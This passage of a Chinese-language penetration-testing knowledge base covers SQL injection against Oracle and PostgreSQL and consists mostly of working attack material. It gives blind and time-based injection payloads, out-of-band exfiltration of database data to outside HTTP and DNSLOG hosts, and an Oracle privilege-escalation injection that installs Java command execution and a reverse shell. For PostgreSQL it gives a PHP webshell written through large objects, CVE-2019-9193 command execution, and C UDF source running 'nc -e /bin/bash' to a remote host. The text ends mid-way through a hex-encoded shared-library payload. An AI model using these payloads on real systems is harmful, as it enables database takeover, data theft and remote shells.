ordsys.ord_dicom.getmappingxpath() select ordsys.ord_dicom.getmappingxpath((select banner from v$version where banner like 'Oracle%'),1,1) from dual -- web payload and (select ordsys.ord_dicom.getmappingxpath((select banner from v$version where banner like 'Oracle%'),1,1) from dual) is null utl_inaddr.*() 函数说明： 用于取得局域网或Internet环境中的主机名和IP地址。（那岂不是也可以通过DNSLOG来判断是否存在注入了？） 1、utl_inaddr.get_host_address -- 如果查询失败，则提示系统错误 select utl_inaddr.get_host_address((select user from dual)) from dual; 2、UTL_INADDR.get_host_name -- 如果查询失败，则提示系统错误 select utl_inaddr.get_host_name((select user from dual)) from dual; 盲注 布尔盲注 概述 Oracle 布尔盲注和Mysql盲注一样，通过页面对带入数据库永真/假条件返回的内容差异，从而判断是否可以进行布尔盲注。通常页面返回存在(true)/不存在(false)两个结果，就可以判断是否存在布尔注入了 注入流程 整个流程还是和union注入一样，只是盲注的过程中需要一个字符一个字符的来判断，比较费时费力，一般采用工具的来辅助 确认闭合情况 确定字段的数量 确定页面回显位 利用已知回显位查询数据 a.查询数据库基本信息 b.爆库名 c.爆表名 d.爆字段 e.查询敏感信息 常用函数 相比于union注入，主要是一些判断和切割的函数 ascii() substr() length() decode(a,b,c,d) ：当a=b 返回c，否则返回d instr(a,b) ：如果b字符串存在a中，返回b在a中存在的位置，否则返回0 注入举例 语句都一样，只是单字符判断，举几个例子抛砖引玉吧 探测当前数据库用户 -- 查询语句 select user from dual; -- payload and ascii(substr((select user from dual),1,1))>82 -- - 正常页面 and ascii(substr((select user from dual),1,1))>83 -- - 不正常页面 and ascii(substr((select user from dual),1,1))=83 -- - 正常页面，说明第一位是 S 确认数据库的长度 以第一个数据库为例子，确定库的长度 -- 查询语句 select length(owner) from (select t.* ,rownum as no from (select distinct owner from all_tables)t) where no = 1; select length(owner) from (select t.* ,rownum as no from (select distinct owner from all_tables)t) where no between 1 and 1; -- payload and (select length(owner) from (select t.* ,rownum as no from (select distinct owner from all_tables)t) where no = 1) > 10 -- - 正常页面 and (select length(owner) from (select t.* ,rownum as no from (select distinct owner from all_tables)t) where no = 1) > 11 -- - 非正常页面 and (select length(owner) from (select t.* ,rownum as no from (select distinct owner from all_tables)t) where no = 1) = 11 -- - 正常页面 因此可以确定第一个数据库长度为11 确认第一个数据库的第一个字符 其他字符依次猜解即可 -- 查询语句 select ascii(substr((select owner from (select t.* ,rownum as no from (select distinct owner from all_tables)t) where no = 1),1,1)) from dual; select ascii(substr((select owner from (select t.* ,rownum as no from (select distinct owner from all_tables)t) where no between 1 and 1),1,1)) from dual; -- payload and (select ascii(substr((select owner from (select t.* ,rownum as no from (select distinct owner from all_tables)t) where no = 1),1,1)) from dual) = 65 -- - 时间盲注 概述 和布尔盲注一样，只是无法从页面返回的情况来判断，只能通过响应时间进行判断 流程也一样 常用函数 decode(a,b,c,d) ：当a=b 返回c，否则返回d，类似mysql中的if case...when...then...else...end DBMS_PIPE.RECEIVE_MESSAGE DBMS_PIPE.RECEIVE_MESSAGE Oracle主要是使用DBMS_PIPE.RECEIVE_MESSAGE('pipename',timeout)函数，该函数从指定管道获取消息 pipename为varchar(128)的字符串，用以指定管道名称，在这里我们输入任意值即可。 timeout为integer的可选输入参数，用来指定等待时间。 select dbms_pipe.receive_message('aa', 5) from dual; 有了延时函数，再配合decode，就和其他盲注一样了 函数注入举例 查询当前数据库用户 -- 查询语句 select decode(ascii(substr((select user from dual),1,1)),83,dbms_pipe.receive_message('aa', 5),1) from dual; -- payload and decode(ascii(substr((select user from dual),1,1)),83,dbms_pipe.receive_message('aa', 5),1) is null -- - 延时5秒以上，说明第一位是 S 也可以使用case...when.. then...else...end来代替decode -- 查询语句 select case when (ascii(substr((select user from dual),1,1))=83) then dbms_pipe.receive_message('aa', 5) else 1 end from dual; -- payload and (case when (ascii(substr((select user from dual),1,1))=83) then dbms_pipe.receive_message('aa', 5) else 1 end) = 1 -- - 子查询/超大表构造时间盲注 时间盲注不一定要用DBMS_PIPE.RECEIVE_MESSAGE()函数，当在进行笛卡尔积，或者查询系统表，子查询大表的时候也会造成数据库查询时间很慢，比如在布尔盲注中查询当前用户权限可访问的数据库，需要一个一个表示的时候，在子查询中去重就会消耗大量时间 -- 查询语句 select count(*) from all_objects; select distinct owner from all_tables cross join session_privs; select distinct owner from all_tables cross join session_privs cross join user_tables; -- payload and (case when (1=1) then (select distinct owner from all_tables cross join session_privs cross join user_tables) else 1 end) = 1 -- - 带外(OOB)注入 概述 既然是带外，就一定需要用户可访问网络的权限 如果数据长度太长，如数据库版本，可能会导致出错，这时候要使用带外，就可以使用substr()函数来截取字符串，每次取几个特定的字符即可 利用函数 url_http.request() 使用||拼接字符外带出来，可以远程启动HTTP服务，或者nc远程监听某个端口 select utl_http.request('http://192.168.0.100:8888/?'||(select banner from v$version where banner like 'Oracle%')) from dual; -- payload and utl_http.request('http://ip:port/?'||(select banner from v$version where banner like 'Oracle%'))=1 -- - utl_inaddr.get_host_address() select utl_inaddr.get_host_address((select user from dual)||'.u6uhyf.dnslog.cn') from dual; -- payload and (select utl_inaddr.get_host_address((select user from dual)||'.u6uhyf.dnslog.cn') from dual) is not null -- - SYS.DBMS_LDAP.INIT() select SYS.DBMS_LDAP.INIT((select user from dual)||'.22j9po.dnslog.cn',80) from dual; HTTPURITYPE() 可以使用http服务，或者nc创建监听，或者dnslog外带 select HTTPURITYPE('http://127.0.0.1:8888/?'||(select user from dual)).GETCLOB() FROM DUAL; 扩展 Oracle XXE 实际上是CVE-2014-6577，受影响的版本：11.2.0.3，11.2.0.4，12.1.0.1 和12.1.0.2 Oracle XXE 的效果和 UTL_http 的效果差不多，都是将数据传输到远端服务器上。但是，由于 extractvalue() 函数对所有数据库用户都可以使用，不存在权限的问题，所以当在低权限没有UTL_http 权限时，这个不失为一个好方法 select extractvalue(xmltype(' %remote;]>'),'/l') from dual; Oracle 提权漏洞 原理是 GET_DOMAIN_INDEX_TABLES 函数的参数存在注入。而该函数的所有者是 sys，所以通过注入就可以执行任意 sql 语句。而该函数的执行权限为 public，所以只要遇到一个 Oracle 的注入点并且存在这个漏洞的，基本上都可以提升到最高权限。 select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES( '1', '1', 'DBMS _OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''your own payload'''';END;'';END;--', 'SYS', 0, '1', 0 ) from dual; 权限提升之后就可以做很多事了，因为 Oracle 可以执行 JAVA 代码，所以在提升权限后具体怎么操作，就看各自的 JAVA 水平了。 这里给出几种常见的利用方式（以下均为 your own payload 处的代码）： 命令执行 1、创建JAVA代码 create or replace and compile java source named \"Command\" as import java.io.*;public class Command{public static String exec(String cmd) throws Exception{String sb=\"\";BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());BufferedReader inBr = new BufferedReader(new InputStreamReader(in));String lineStr;while ((lineStr = inBr.readLine()) != null)sb+=lineStr+\"\\n\";inBr.close();in.close();return sb;}} 2、赋予代码执行权限 begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''>'''''''', ''''''''execute'''''''' );end; 3、创建函数 create or replace function cmd(p_cmd in varchar2) return varchar2 as language java name ''''''''Command.exec(java.lang.String) return String''''''''; 4、赋予函数执行权限 grant all on cmd to public 5、执行命令 select sys.cmd('whoami') from dual; 反弹shell 1、创建java代码 create or replace and compile java source named \"shell\" as import java.io.*;import java.net.*;public class shell{public static void run() throws Exception {Socket s = new Socket(\"your own ip\", 80);Process p = Runtime.getRuntime().exec(\"cmd.exe\");new T(p.getInputStream(), s.getOutputStream()).start();new T(p.getErrorStream(), s.getOutputStream()).start();new T(s.getInputStream(), p.getOutputStream()).start();}static class T extends Thread {private InputStream i;private OutputStream u;public T(InputStream in, OutputStream out) {this.u = out;this.i = in;}public void run() {BufferedReader n = new BufferedReader(new InputStreamReader(i));BufferedWriter w = new BufferedWriter(new OutputStreamWriter(u));char f[] = new char[8192];int l;try {while ((l = n.read(f, 0, f.length)) > 0) {w.write(f, 0, l);w.flush();}} catch (IOException e) {}try {if (n != null)n.close();if (w != null)w.close();} catch (Exception e) {}}}} 2、赋予代码执行权限 begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.net.SocketPermission'''''''', ''''''''<>'''''''', ''''''''*'''''''' );end; 3、创建函数 create or replace function reversetcp RETURN VARCHAR2 as language java name ''''''''shell.run() return String''''''''; 4、赋予函数执行权限 grant all on reversetcp to public 5、执行命令 select sys.reversetcp from dual; Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-25 15:14:08 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/05.Oracle/03.绕过技巧.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/05.Oracle/03.绕过技巧.html","title":"03.绕过技巧","keywords":"","body":" 通用方法 绕过空格 绕过等号= 绕过注释符 [!TIP] 绕过主要还是利用一些特性来，如数据库的特性、中间件的特性等，所以还是要熟悉函数等 通用方法 通用的方法，就是万金油，无非就是大小写、双写、编码、注释、HPP、垃圾字符、分块传输、WAF特性 官方文档：https://docs.oracle.com/cd/E11882_01/server.112/e41084/functions.htm#SQLRF006 绕过空格 空格被过滤的情况，常规可以用如下的一些手法： 说明 Payload 使用注释符 SELECT/**/version/**/FROM/**/v$instance; URL编码空格 + 其他URL编码（换行、Tab等） %0a、%09 绕过等号= 过滤了等号或者相关的匹配符，可以采用如下的一些手法来绕过 Payload 说明 <>、>、 不等符、大于、小于 select 1 from dual where 1 between 1 and 2;select 1 from dual where 1 not between 1 and 2; between语句，在两值之间 select 1 from dual where 1 in (1);select 1 from dual where 1 not in (1); in语句，在集合中 select 1 from dual where '123' like '1%'; like模糊匹配 绕过注释符 对注释符过滤的情况下，对我们来说问题可能就是语句不能正常执行 解决办法也很简单，用完整语句给他闭合就OK了，其他语句类似 # 原始 ?id=1 # 完整闭合 ?id=1' and expr and '1'='1 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-03-07 17:14:17 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/06.PostgreSQL/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/06.PostgreSQL/","title":"06.PostgreSQL","keywords":"","body":"环境搭建 大家平时接触的最多的主要是前3类，这类相对比较少，所以环境方面可能也没有，这里提供一个快速搭建postgresql的方法，方便练习相关语句 docker pull postgres:9.6 docker run -it -d --rm --name postgres -e POSTGRES_PASSWORD=admin -p 127.0.0.1:5432:5432 -v pgdata:/var/lib/postgresql/data postgres:9.6 docker exec -it postgres psql -Upostgres 和mysql语法类似，创建语句 # 创建数据库 create database test; # 切换数据库 \\c test; # 创建表 create table test(title varchar(100), context text); 查看信息 \\l # 展示数据库 \\dt # 展示表 \\d 表名 # 查看表结构 插入数据 insert into test(title, context) values('test1', 'test1 content'); select * from test; update test set title='test2' where title='test1'; delete from test where title='test2'; 备份与还原 # 备份 pg_dump -Upostgres -dtest -F c -f dump.sql # 还原 pg_restore -Upostgres -dtest -Fc dump.dmp Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-19 14:10:17 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/06.PostgreSQL/01.常用符号:函数:语句归类.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/06.PostgreSQL/01.常用符号:函数:语句归类.html","title":"01.常用符号:函数:语句归类","keywords":"","body":" 常用符号 注释符 常用函数 字符串函数 转换函数 判断函数 休眠函数 常用语句 数据库版本 获取当前用户 获取所有的数据库 获取当前数据库 获取当前数据库所有schema 获取当前数据库模式 获取当前schema的表名 获取当前表的列名 获取当前表的值 string_agg(字段,分隔符) 实现group_concat array_to_string(array_agg(字段，分隔符)) 常用符号 注释符 符号 说明 空格--空格 单行注释 /**/ 多行(内联)注释 \\ \\ 字符串拼接，select chr(97)｜｜pg_sleep(5); ::text 类型转换为text 常用函数 字符串函数 函数 描述 string 丨丨 string 字串连接'Post' 丨丨 'greSQL' => PostgreSQL bit_length(string) 字串里二进制位的个数bit_length('jose') => 32 char_length(string) 字串中的字符个数char_length('jose') => 4 convert(string using conversion_name) 使用指定的转换名字改变编码。convert('PostgreSQL' using iso_8859_1_to_utf8) =>'PostgreSQL' lower(string) 把字串转化为小写 octet_length(string) 字串中的字节数octet_length('jose') => 4 overlay(string placing string from int [for int]) 替换子字串overlay('Txxxxas' placing 'hom' from 2 for 4) => Thomas position(substring in string) 返回指定的子字串的位置position('om' in 'Thomas') =>3 substring(string [from int] [for int]) 抽取子字串 substring(string from pattern) 抽取匹配 POSIX 正则表达式的子字串 substring(string from pattern for escape) 抽取匹配SQL正则表达式的子字串 trim([leading丨trailing 丨 both] [characters] from string) 从字串string的开头/结尾/两边/ 删除只包含characters(默认是一个空白)的最长的字串 upper(string) 把字串转化为大写。 ascii(text) 参数第一个字符的ASCII码 btrim(string text [, characters text]) 从string开头和结尾删除只包含在characters里(默认是空白)的字符的最长字串 chr(int) 给出ASCII码的字符 convert(string text, [src_encoding name,] dest_encoding name) 把字串转换为dest_encoding initcap(text) 把每个单词的第一个字母转为大写，其它的保留小写。单词是一系列字母数字组成的字符，用非字母数字分隔。 length(string text) string中字符的数目 lpad(string text, length int [, fill text]) 通过填充字符fill(默认为空白)，把string填充为长度length。 如果string已经比length长则将其截断(在右边)。 ltrim(string text [, characters text]) 从字串string的开头删除只包含characters(默认是一个空白)的最长的字串。 md5(string text) 计算给出string的MD5散列，以十六进制返回结果。 repeat(string text, number int) 重复string number次。repeat('Pg', 4) => PgPgPgPg replace(string text, from text, to text) 把字串string里出现地所有子字串from替换成子字串to。 rpad(string text, length int [, fill text]) 通过填充字符fill(默认为空白)，把string填充为长度length。如果string已经比length长则将其截断。 rtrim(string text [, character text]) 从字串string的结尾删除只包含character(默认是个空白)的最长的字 split_part(string text, delimiter text, field int) 根据delimiter分隔string返回生成的第field个子字串(1 Base)。split_part('abc~@~def~@~ghi', '~@~', 2) => def strpos(string, substring) 声明的子字串的位置。strpos('high','ig') => 2 substr(string, from [, count]) 抽取子字串。 to_hex(number int/bigint) 把number转换成其对应地十六进制表现形式。 translate(string text, from text, to text) 把在string中包含的任何匹配from中的字符的字符转化为对应的在to中的字符。translate('12345', '14', 'ax') => a23x5 转换函数 函数 描述 to_char(timestamp, text) 将时间戳转换为字符串 to_char(interval, text) 将时间间隔转换为字符串 to_char(int, text) 整型转换为字符串 to_char(double precision, text) 双精度转换为字符串 to_char(numeric, text) 数字转换为字符串 to_date(text, text) 字符串转换为日期 to_number(text, text) 转换字符串为数字 to_timestamp(text, text) 转换为指定的时间格式 time zone convert string to time stamp to_timestamp(double precision) 把UNIX纪元转换成时间戳 判断函数 表达式 说明 case...when(expr) then result1 else result2 end 同if 表达式 COALESCE(value [, ...]) COALESCE 函数返回其第一个非空参数。只有当所有参数都为 null 时才返回 Null。当检索数据以进行显示时，它通常用于将默认值替换为空值 NULLIF(value1, value2) 如果 value1 等于 value2，则 NULLIF 函数返回空值；否则返回 value1 休眠函数 函数 描述 pg_sleep(second) 休眠second秒 pg_sleep_for(interval) 9.4及之后版本新增，休眠5秒 pg_sleep_for('5 sec') pg_sleep_until(timestamp with time zone) 9.4及之后版本新增 pg_sleep_until('2022-01-19 10:25:20'); 常用语句 参考：https://bak.gm7.org/sqlwiki.netspi.com/attackQueries/informationGathering/index.html#postgresql 数据库版本 select version(); 获取当前用户 select user; 获取所有的数据库 select datname from pg_database; 获取当前数据库 select current_database(); 获取当前数据库所有schema [!NOTE] 也就是存表的地方 select schemaname from pg_tables; select distinct schemaname from pg_tables; 获取当前数据库模式 select current_schema; 获取当前schema的表名 select tablename from pg_tables where schemaname = 'public'; -- 或者从该库的information_schema.tables获取 select table_name from information_schema.tables where table_schema='public'; 获取当前表的列名 SELECT attname FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND a.relname='test' AND nspname='public'; select column_name from information_schema.columns where table_name = 'test'; 获取当前表的值 select title from test; string_agg(字段,分隔符) 实现group_concat select string_agg(datname,',') from pg_database; array_to_string(array_agg(字段，分隔符)) select array_to_string(array_agg(datname),',') from pg_database; Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-25 15:14:08 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/06.PostgreSQL/02.各种注入手法.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/06.PostgreSQL/02.各种注入手法.html","title":"02.各种注入手法","keywords":"","body":" 联合查询(UNION)注入 注入流程 字段数 显示位 获取数据 报错注入 概念 相关函数 CAST ::运算符 盲注 布尔盲注 核心思路 常用函数 举例 时间盲注 核心思路 常用函数 举例 堆叠注入 Order By注入 文件读写 读文件 写文件 利用copy 大对象数据写入 命令执行 低版本的命令执行 高版本的命令执行 CVE-2019-9193 UDF提权 联合查询(UNION)注入 [!TIP] 和之前的其他数据库一样，大概记录一下语句 注入流程 确定字段数 确定显位 获取数据 字段数 select * from table_name from column_name = 'xxx' order by 3 -- 正常 select * from table_name from column_name = 'xxx' order by 4 -- 不正常 显示位 select * from table_name from column_name = 'xxx' union select '1','2','3' 获取数据 假设显位是2，列举几个，抛砖引玉 # 查询版本 select * from table_name from column_name = 'xxx' union select '1',version(),'3' # 查询用户 select * from table_name from column_name = 'xxx' union select '1',user,'3' # 当前数据库 select * from table_name from column_name = 'xxx' union select '1',current_database(),'3' 报错注入 报错注入在postgresql其实不太常见，由于postgresql默认支持堆叠查询，所以通常使用堆叠查询就直接getshell了 概念 和其他一样，都是依赖于让sql语句在执行的过程中抛出异常信息，主要是类型转换。 相关函数 CAST select cast((select version()) as int); select title from test where title='a' and cast((select version()) as int) = 1; ::运算符 select version()::text::int; select title from test where title='a' and (select version()::text::int) = 1; 盲注 布尔盲注 核心思路 根据页面返回的情况来判断true/false，然后一位一位的判断是否正确 常用函数 ascii() substring()/substr() length() 举例 select title from test where title='a' and 2*2 = 4; -- true select title from test where title='a' and 2*2 = 5; -- false select title from test where title='a' and ascii(substring((select current_database()),1,1)) > 99; -- true select title from test where title='a' and ascii(substring((select current_database()),1,1)) > 120; -- false select title from test where title='a' and ascii(substring((select current_database()),1,1)) = 116; -- true 时间盲注 核心思路 在布尔盲注的基础上，通过一些判定语句，来看看是否存在延时等。 常用函数 pg_sleep() case when(expr1) then result1 else result2 end pg_sleep_for(interval) 举例 [!TIP|style:flat] 当and后面的条件不能用expr1=expr2这种，可以和oracle一样使用is null来判断 # 拼接在语句中 select title from test where title='a' and (select pg_sleep_for('5 sec')) is null; # 堆叠 select title from test where title='a';select pg_sleep_for('5 sec'); # 加入判断条件 select title from test where title='a' and (select case when((ascii(substring((select current_database()),1,1))) = 116) then pg_sleep(5) else null end) is null; 堆叠注入 postgresql和mssql一样，默认支持多语句，闭合前语句，再使用;分隔前后的语句，以达到堆叠查询的目的。 由于堆叠查询的特殊性，也可以利用postgresql的特殊休眠函数pg_sleep()快速判断是否是postgresql Payload: ?id=1';select pg_sleep(5) -- aaa 在判断出注入点以及是postgresql且可堆叠查询的情况下，可以使用CVE-2019-9193，执行任意命令，反弹shell，从版本9.3开始，Postgres新增了一个“COPY TO/FROM PROGRAM”功能。这个功能简单来说就是允许数据库的超级用户以及pg_read_server_files组中的任何用户执行操作系统命令 Order By注入 order by 注入通常出现在排序中，前端展示的表格，某一列需要进行升序或者降序排列，或者做排名比较的时候常常会用到order by排序，order by在select语句中，紧跟在where [where condition]后，且order by 注入无法使用预编译来防御，由于order by 后面需要紧跟column_name，而预编译是参数化字符串，而order by后面紧跟字符串就会提示语法错误，通常防御order by 注入需要使用白名单的方式。 通过order by 列名，根据排序返回的情况来判断是否存在，或者使用超大数，构成SQL语句错误 [!TIP|style:flat] postgresql 的order by 注入，涉及条件相当复杂，由于postgresql order by 后面要紧跟true，或者false，需要使用case...when...then...else...end表达式嵌套SELECT和CASE WHEN语句，直到可以将\"布尔盲注成功利用，然后睡眠5秒\"转换为\"true或false\" 如果开启了报错，可以直接用报错注入 select case when((select case when(select user = 'postgres') then (select true from PG_SLEEP(5)) else false end)) then true else false end; select case when(select user = 'postgres') then (select 1 from pg_sleep(2)) else 1 end; 文件读写 文件读写在postgresql中比较方便利用，postgresql 8.1后提供了一组现成的文件操作函数（pg_logdir_ls()、pg_ls_dir()、pg_file_rename()、pg_file_write()、 pg_read_file()、pg_length_file()）来读取/写入，但是有限制，因为pg_xxx这个adminpack将权限限制在了./postgresql/data 下面列举一个可行的方案 读文件 创建数据表将读到的文件copy入表 drop table if exists test; CREATE TABLE test(t TEXT); COPY test FROM '/etc/passwd'; SELECT * FROM test; # 堆叠，变成一句 drop table if exists test;CREATE TABLE test(t TEXT);COPY test FROM '/etc/passwd';SELECT * FROM test; 写文件 利用copy COPY (select '') to '/tmp/1.php'; 大对象数据写入 pg_largeobject表保存那些标记着”大对象”的数据。 一个大对象是使用其创建时分配的 OID 标识的。 每个大对象都分解成足够小的小段或者”页面”以便以行的形式存储在 pg_largeobject里。 每页的数据定义为LOBLKSIZE(目前是BLCKSZ/4，或者通常是 2K 字节) [!TIP] 下面UDF提权也是用的这个方法 SELECT lo_create(9999); delete from pg_largeobject where loid=9999; insert into pg_largeobject (loid,pageno,data) values(9999, 0, decode('3c3f706870204073797374656d2822245f4745545b636d645d22293b3f3e', 'hex')); -- 或 insert into pg_largeobject values(9999,0,''); SELECT lo_export(9999, '/tmp/shell.php'); Select lo_unlink(9999); 命令执行 低版本的命令执行 可以直接调用/lib/libc.so.6或者是/lib64/libc.so.6；一般8.2以下的版本可以 未尝试 CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE C STRICT; CREATE FUNCTION system(cstring) RcETURNS int AS '/lib64/libc.so.6', 'system' LANGUAGE C STRICT; select system('id'); 高版本的命令执行 CVE-2019-9193 CVE-2019-9193，执行任意命令，反弹shell，从版本9.3开始，Postgres新增了一个“COPY TO/FROM PROGRAM”功能。这个功能简单来说就是允许数据库的超级用户以及pg_read_server_files组中的任何用户执行操作系统命令 Payload: DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'echo dG91Y2ggL3RtcC90ZXN0Cg==|base64 -d|bash'; select * from cmd_exec; -- 查看执行的结果，如果是反弹shell等无回显的，可以忽略这一步 UDF提权 Userdefined function 当postgresql版本高于8.2存在安全机制无法调用系统libc.so.6所以需要自己利用UDF进行命令执行 第一步可以先查看postgresql支持的扩展语言: select * from pg_language; lanname | lanowner | lanispl | lanpltrusted | lanplcallfoid | laninline | lanvalidator | lanacl ----------+----------+---------+--------------+---------------+-----------+--------------+-------- internal | 10 | f | f | 0 | 0 | 2246 | c | 10 | f | f | 0 | 0 | 2247 | sql | 10 | f | t | 0 | 0 | 2248 | plpgsql | 10 | t | t | 12394 | 12395 | 12396 | 支持C，那么可以用C编译一个恶意的so文件，然后让psql加载达到我们的目的 [!TIP|style:flat] 不想自己编译so，可以找网上别人编译好的，但是注意有风险：https://github.com/Dionach/pgexec/tree/master/libraries 反弹shell后门示例： #include \"postgres.h\" #include \"fmgr.h\" #include #ifdef PG_MODULE_MAGIC PG_MODULE_MAGIC; #endif text *exec() { system(\"nc -e /bin/bash vpsIPaddress 2333\"); } 需要存在postgres.h头文件，所以编译的目录应为存在postgres.h头部调用的库 find ./ -name \"postgres.h\" 编译 gcc hack.c -I`pg_config --includedir-server` -fPIC -shared -o udf.so strip -sx udf.so #缩减so文件大小 将文件hex后去除\\n cat udf.so | xxd -ps | tr -d \"\\n\" > test.txt 接下来我们需要将udf.so文件分割成每2048字节的块,最后一个块的大小不满足2048字节不需要考虑. [!NOTE] 为什么不能小于2048?是因为在postgresql高版本处理中,如果块之间小于2048,默认会用0去填充让块达到2048字节所以上传的文件才会一直创建函数失败. 用python脚本去分割udf.so文件,2个16进制数是一个字节所以按照4096个16进制数分割： #~/usr/bin/env python 2.7 #-*- coding:utf-8 -*- import sys from random import randint number = randint(1000, 9999) if __name__ == \"__main__\": if len(sys.argv) != 2: print \"Usage:python \" + sys.argv[0] + \"inputfile\" sys.exit() fileobj = open(sys.argv[1],'rb') i = 0 t = -1 s = '' for b in fileobj.read(): i = i + 1 s += b if i % 4096 == 0: t = t + 1 print 'insert into pg_largeobject values ({number}, {block}, decode(\\'{payload}\\',\\'hex\\'));\\n'.format(number=number, block=t, payload=s) s = '' fileobj.close() 分割完成后按照下文中的sql语句执行： 写入对象 创建文件 建立函数 执行命令 清理函数 这里我直接给出hex分片过sql语句直接写入即可创建成功（9.6版本测试有效，如果目标是更加新的版本需要对应安装postgresql-dev扩展包编译代码） SELECT lo_create(9023); insert into pg_largeobject values (9023, 0, decode('7f454c4602010100000000000000000003003e0001000000000d0000000000004000000000000000e8210000000000000000000040003800070040001a00190001000000050000000000000000000000000000000000000000000000000000004c140000000000004c1400000000000000002000000000000100000006000000f81d000000000000f81d200000000000f81d200000000000d802000000000000e00200000000000000002000000000000200000006000000181e000000000000181e200000000000181e200000000000c001000000000000c00100000000000008000000000000000400000004000000c801000000000000c801000000000000c80100000000000024000000000000002400000000000000040000000000000050e5746404000000cc11000000000000cc11000000000000cc110000000000006c000000000000006c00000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000f81d000000000000f81d200000000000f81d200000000000080200000000000008020000000000000100000000000000040000001400000003000000474e550052705bc9352a28aa252e8edf0fbc5d4c32e634e800000000030000001a00000002000000070000008440030810890c99880c008dc84400001a0000002100000026000000325e541ea868be124245d5ec2e67541eaa5fbe12bae3927c5f4de3214aad229d32a1f45bd871581cb88df10e25681b32c60da6d4ead3ef0e6637d3ed339268fe000000000000000000000000000000000000000000000000000000000000000003000900580b0000000000000000000000000000de00000012000000000000000000000000000000000000000901000012000000000000000000000000000000000000001c00000020000000000000000000000000000000000000007601000012000000000000000000000000000000000000006f01000012000000000000000000000000000000000000003a0100001200000000000000000000000000000000000000d60000001200000000000000000000000000000000000000110100001200000000000000000000000000000000000000fb0000001200000000000000000000000000000000000000690100001200000000000000000000000000000000000000010000002000000000000000000000000000000000000000c500000010000000000000000000000000000000000000009800000012000000000000000000000000000000000000006301000012000000000000000000000000000000000000000101000012000000000000000000000000000000000000003f0100001200000000000000000000000000000000000000f500000012000000000000000000000000000000000000005d0100001200000000000000000000000000000000000000320100001200000000000000000000000000000000000000610000002000000000000000000000000000000000000000380000002000000000000000000000000000000000000000520000002200000000000000000000000000000000000000dd00000010000000000000000000000000000000000000002d0100001200000000000000000000000000000000000000e300000012000b00d20e0000000000000800000000000000bc00000012000b00850e0000000000004d000000000000008601000010001600d0202000000000000000000000000000b300000012000b007d0e0000000000000800000000000000ec00000012000b00da0e000000000000c3000000000000009901000010001700d82020000000000000000000000000005001000012000b003b1000000000000031010000000000001801000012000b009d0f00000000000008000000000000008300000012000b00ed0d00000000000030000000000000008d01000010001700d02020000000000000000000000000001000000012000900580b00000000000000000000000000002101000012000b00a50f0000000000008e000000000000007500000012000b00e50d00000000000008000000000000001600000012000c006c1100000000000000000000000000004701000012000b00331000000000000008000000000000009f00000012000b001d0e0000000000006000000000000000005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c61737365730050675f6d616769635f66756e6300746578745f7074725f746f5f636861725f707472006d616c6c6f63006368725f7074725f746f5f746578745f7074720070675f66696e666f5f7379735f657865630070675f6465746f6173745f646174756d0073797374656d0070667265650070675f66696e666f5f7379735f6576616c00706f70656e006667657473007265616c6c6f63007374726e6370790070636c6f73650070675f66696e666f5f7379735f62696e6576616c00666f726b00737973636f6e66006d6d617000776169747069640070675f66696e666f5f7379735f66696c657265616400666f70656e00667365656b006674656c6c0066636c6f7365006672656164006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e3500000000000200', 'hex')); insert into pg_largeobject values (9023, 1, decode('0200000002000200020002000200020002000000000002000200020002000200020002000000000002000000020001000100010001000100010001000100010001000100010001000100010001000000010001007c0100001000000000000000751a6909000002009e01000000000000f81d2000000000000800000000000000b00d000000000000001e2000000000000800000000000000700d000000000000101e2000000000000800000000000000101e200000000000d81f20000000000006000000040000000000000000000000e01f200000000000060000000c0000000000000000000000e81f20000000000006000000150000000000000000000000f01f20000000000006000000160000000000000000000000f81f200000000000060000001700000000000000000000001820200000000000070000000200000000000000000000002020200000000000070000000300000000000000000000002820200000000000070000000500000000000000000000003020200000000000070000000600000000000000000000003820200000000000070000000700000000000000000000004020200000000000070000000800000000000000000000004820200000000000070000000900000000000000000000005020200000000000070000000a00000000000000000000005820200000000000070000002200000000000000000000006020200000000000070000000b00000000000000000000006820200000000000070000000c00000000000000000000007020200000000000070000000d00000000000000000000007820200000000000070000000e00000000000000000000008020200000000000070000000f0000000000000000000000882020000000000007000000100000000000000000000000902020000000000007000000110000000000000000000000982020000000000007000000120000000000000000000000a02020000000000007000000130000000000000000000000a82020000000000007000000140000000000000000000000b02020000000000007000000170000000000000000000000b82020000000000007000000180000000000000000000000c02020000000000007000000190000000000000000000000c820200000000000070000002900000000000000000000004883ec08488b057d1420004885c07405e8c30000004883c408c30000000000000000000000000000ff3582142000ff25841420000f1f4000ff25821420006800000000e9e0ff